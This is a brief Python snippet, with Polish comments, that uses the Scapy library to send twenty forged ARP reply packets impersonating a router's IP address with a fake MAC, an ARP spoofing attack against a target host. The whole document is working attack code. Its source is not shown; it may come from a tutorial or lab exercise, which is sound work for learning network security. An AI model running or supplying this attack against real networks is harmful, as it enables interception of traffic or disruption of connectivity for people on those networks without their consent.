from scapy.all import *

for x in range(20):
  send(ARP( op=2,  
            pdst=target_ip,  # Cel
            hwdst="ff:ff:ff:ff:ff:ff",  # Rozgłoszenie (lub prawdziwy MAC celu)
            psrc=router_ip,  # Fałszowany IP (udajemy router)
            hwsrc=fake_mac))

